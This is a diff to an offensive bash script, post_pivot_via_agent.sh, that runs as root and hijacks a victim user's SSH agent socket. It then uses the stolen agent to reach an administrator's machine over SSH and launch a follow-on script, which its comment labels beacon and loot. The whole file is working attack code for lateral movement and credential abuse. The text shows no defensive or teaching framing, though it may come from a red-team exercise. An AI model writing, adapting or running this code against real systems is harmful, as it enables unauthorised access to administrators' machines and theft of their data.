@@ -1,20 +1,17 @@
 #!/usr/bin/env bash
-# Full chain: hijack agent from legacy session → SSH admin PC → run remote script.
+# Agent hijack → post_pivot_admin_host.sh (beacon / loot).
+# Usage: sudo ./post_pivot_via_agent.sh <ADMIN_IP> [admin_ssh_port]
 set -euo pipefail
 DIR="$(cd "$(dirname "${BASH_SOURCE[0]}")" && pwd)"
+# shellcheck source=lib.sh
+source "$DIR/lib.sh"
+
 ADMIN_IP="${1:-}"
+[[ -n "$ADMIN_IP" ]] || { echo "Usage: $0 <ADMIN_IP> [admin_ssh_port]"; exit 1; }
+
+export VICTIM_USER="${VICTIM_USER:-legacy}"
 export LOOT_DIR="${LOOT_DIR:-/tmp}"
+AUTH_SOCK="$(find_agent_sock)" || { echo "[-] No agent for ${VICTIM_USER}"; exit 1; }
 
-[[ -n "$ADMIN_IP" ]] || { echo "Usage: $0 <ADMIN_IP>"; exit 1; }
-
-VICTIM_USER="${VICTIM_USER:-legacy}"
-AUTH_SOCK=""
-shopt -s nullglob
-for s in /home/"${VICTIM_USER}"/.ssh/agent/*; do
-  [[ -S "$s" ]] && AUTH_SOCK="$s" && break
-done
-shopt -u nullglob
-[[ -n "$AUTH_SOCK" ]] || { echo "[-] No agent socket for ${VICTIM_USER}"; exit 1; }
-
-export SSH_AUTH_SOCK="$AUTH_SOCK"
-runuser -u "$VICTIM_USER" -- "$DIR/post_pivot_admin_host.sh" "$ADMIN_IP" "${2:-22}"
+runuser -u "$VICTIM_USER" -- env SSH_AUTH_SOCK="$AUTH_SOCK" \
+  "$DIR/post_pivot_admin_host.sh" "$ADMIN_IP" "${2:-22}"
